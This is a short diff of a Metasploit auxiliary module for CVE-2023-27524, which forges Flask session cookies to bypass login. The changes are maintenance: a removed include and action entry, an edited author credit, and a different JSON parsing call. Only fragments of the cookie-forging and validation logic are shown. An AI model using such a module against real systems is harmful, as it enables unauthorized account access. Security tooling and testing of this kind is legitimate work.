@@ -5,7 +5,6 @@
 
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
-  include Msf::Exploit::Remote::HTTP::FlaskUnsign
   prepend Msf::Exploit::Remote::AutoCheck
 
   def initialize(info = {})
@@ -22,7 +21,7 @@ class MetasploitModule < Msf::Auxiliary
         'Author' => [
           'h00die', # MSF module
           'paradoxis', #  original flask-unsign tool
-          'zeroSteiner', # MSF flask-unsign library
+          'Spencer McIntyre', # MSF flask-unsign library
           'Naveen Sunkavally' # horizon3.ai writeup and cve discovery
         ],
         'References' => [
@@ -34,9 +33,6 @@ class MetasploitModule < Msf::Auxiliary
           ['CVE', '2023-27524' ],
         ],
         'License' => MSF_LICENSE,
-        'Actions' => [
-          [ 'Sign Cookie', { 'Description' => 'Attempts to login to the site, then change the cookie value' } ],
-        ],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
           'Reliability' => [],
@@ -98,7 +94,7 @@ class MetasploitModule < Msf::Auxiliary
         print_bad("#{peer} - Cookie not accepted")
         next
       end
-      data = JSON.parse(res.body)
+      data = res.get_json_document
       print_good("#{peer} - Cookie validated to user: #{data['result']['username']}")
       return encoded_cookie
     end
